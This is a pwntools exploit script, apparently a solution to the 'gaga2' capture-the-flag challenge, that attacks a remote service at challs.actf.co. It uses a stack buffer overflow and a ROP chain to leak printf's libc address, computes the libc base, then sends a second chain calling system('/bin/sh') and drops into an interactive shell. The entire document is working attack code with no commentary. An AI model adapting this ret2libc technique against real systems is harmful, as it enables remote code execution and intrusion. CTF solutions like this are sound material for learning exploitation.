from pwn import *

io = remote('challs.actf.co', 31302)
#io = process('./gaga2')
elf = ELF('./gaga2')
libc = ELF('./libc.so.6')


#gdb.attach(io)
io.sendlineafter(b'input: ', b'a'*0x48+p64(0x40101a)+p64(0x4012b3)+p64(elf.got['printf'])+p64(elf.sym['printf'])+p64(0x40101a)+p64(elf.sym['main']))
lib = u64(io.recv(6)+b'\0\0')
libc.address = lib - libc.sym['printf']
log.info(hex(libc.address))
#gdb.attach(io)
io.sendlineafter(b'input: ', b'a'*0x48+p64(0x00000000004012b3)+p64(next(libc.search(b'/bin/sh')))+p64(0x000000000040101a)+p64(libc.sym['system']))
io.interactive()
